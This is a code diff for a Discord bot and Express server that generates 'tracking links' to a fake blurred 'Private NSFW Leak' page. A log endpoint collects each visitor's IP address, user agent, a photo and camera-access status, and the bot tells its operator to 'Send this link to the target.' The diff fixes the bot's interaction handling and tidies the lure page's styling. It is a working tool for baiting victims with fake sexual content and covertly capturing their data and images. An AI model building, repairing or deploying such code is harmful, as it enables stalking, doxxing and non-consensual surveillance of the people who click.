@@ -9,7 +9,7 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 // ================== ENV VARIABLES ==================
 const TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
-const DOMAIN = process.env.DOMAIN;   // Must be https://clicklink.space
+const DOMAIN = process.env.DOMAIN;   // Should be https://clicklink.space
 
 if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
   console.error("❌ Missing environment variables!");
@@ -23,7 +23,7 @@ app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== YOUR IMAGE WITH LIGHT BLUR ==================
+// ================== BLURRED LEAK PAGE ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
@@ -42,42 +42,16 @@ app.get('/nsfw-leak/:id', (req, res) => {
   <meta charset="UTF-8">
   <title>Discord • Private NSFW Leak</title>
   <style>
-    body { 
-      background: #0a0a0a; 
-      color: #ddd; 
-      font-family: 'Segoe UI', Arial, sans-serif; 
-      text-align: center; 
-      margin: 0; 
-      padding: 30px 15px; 
-      min-height: 100vh;
-    }
-    .header {
-      color: #ff00aa;
-      font-size: 26px;
-      margin-bottom: 8px;
-    }
-    .subheader {
-      color: #aaa;
-      font-size: 15px;
-      margin-bottom: 25px;
-    }
-    .album {
-      max-width: 420px;
-      margin: 0 auto 30px;
-      background: #111;
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 0 30px rgba(255,0,170,0.4);
-      border: 1px solid #333;
-    }
+    body { background: #0a0a0a; color: #ddd; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 30px 15px; min-height: 100vh; }
+    .header { color: #ff00aa; font-size: 26px; margin-bottom: 8px; }
+    .subheader { color: #aaa; font-size: 15px; margin-bottom: 25px; }
+    .album { max-width: 420px; margin: 0 auto 30px; background: #111; border-radius: 12px; overflow: hidden; box-shadow: 0 0 30px rgba(255,0,170,0.4); border: 1px solid #333; }
     .preview {
       width: 100%;
       height: 480px;
-      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), 
-                  url('https://i.imgur.com/NOrim.png') center/cover no-repeat;
-      background-size: cover;
+      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.7)), url('https://i.imgur.com/NOrim.png') center/cover no-repeat;
       position: relative;
-      filter: blur(6px);           /* Lighter blur */
+      filter: blur(6px);
     }
     .preview::after {
       content: "18+ LEAKED • CENSORED";
@@ -91,36 +65,12 @@ app.get('/nsfw-leak/:id', (req, res) => {
       font-size: 13px;
       font-weight: bold;
     }
-    .info {
-      padding: 15px;
-      background: #1a1a1a;
-      font-size: 14px;
-      color: #bbb;
-    }
-    .progress-container {
-      margin: 30px auto;
-      max-width: 380px;
-    }
-    .progress { 
-      height: 9px; 
-      background: #222; 
-      border-radius: 4px; 
-      overflow: hidden; 
-    }
-    .bar { 
-      height: 100%; 
-      width: 0%; 
-      background: linear-gradient(90deg, #ff00aa, #ff66cc); 
-      animation: load 6.5s linear forwards; 
-    }
-    .status { 
-      color: #00ff99; 
-      font-size: 17px; 
-      margin-top: 12px;
-    }
-    @keyframes load { 
-      to { width: 100%; } 
-    }
+    .info { padding: 15px; background: #1a1a1a; font-size: 14px; color: #bbb; }
+    .progress-container { margin: 30px auto; max-width: 380px; }
+    .progress { height: 9px; background: #222; border-radius: 4px; overflow: hidden; }
+    .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #ff00aa, #ff66cc); animation: load 6.5s linear forwards; }
+    .status { color: #00ff99; font-size: 17px; margin-top: 12px; }
+    @keyframes load { to { width: 100%; } }
   </style>
 </head>
 <body>
@@ -195,7 +145,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
   res.send(html);
 });
 
-// Log endpoint
+// ================== LOG ENDPOINT ==================
 app.post('/log', async (req, res) => {
   const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
   const originalUrl = trackingLinks.get(trackId) || 'Unknown';
@@ -252,7 +202,7 @@ app.post('/log', async (req, res) => {
   res.sendStatus(200);
 });
 
-// ================== DISCORD BOT ==================
+// ================== DISCORD BOT (Fixed for "Application did not respond") ==================
 client.once('ready', () => {
   console.log(`✅ Bot online → ${client.user.tag}`);
 });
@@ -269,11 +219,12 @@ client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;
 
   try {
+    await interaction.deferReply({ flags: MessageFlags.Ephemeral }); // This prevents "did not respond"
+
     const url = interaction.options.getString('url');
     if (!url.startsWith('http')) {
-      return interaction.reply({ 
-        content: '❌ URL must start with http:// or https://', 
-        flags: MessageFlags.Ephemeral 
+      return interaction.editReply({ 
+        content: '❌ URL must start with http:// or https://' 
       });
     }
 
@@ -282,15 +233,14 @@ client.on('interactionCreate', async interaction => {
 
     const trackingLink = `${DOMAIN}/nsfw-leak/${trackId}`;
 
-    await interaction.reply({
+    await interaction.editReply({
       content: `**✅ Clean NSFW Tracking Link Created!**\n\n` +
                `**Tracking Link:** ${trackingLink}\n` +
                `**Redirects to:** ${url}\n\n` +
                `Send this link to the target.`,
-      flags: MessageFlags.Ephemeral
     });
   } catch (err) {
-    console.error("Interaction error:", err);
+    console.error("Interaction error:", err.message);
   }
 });
 
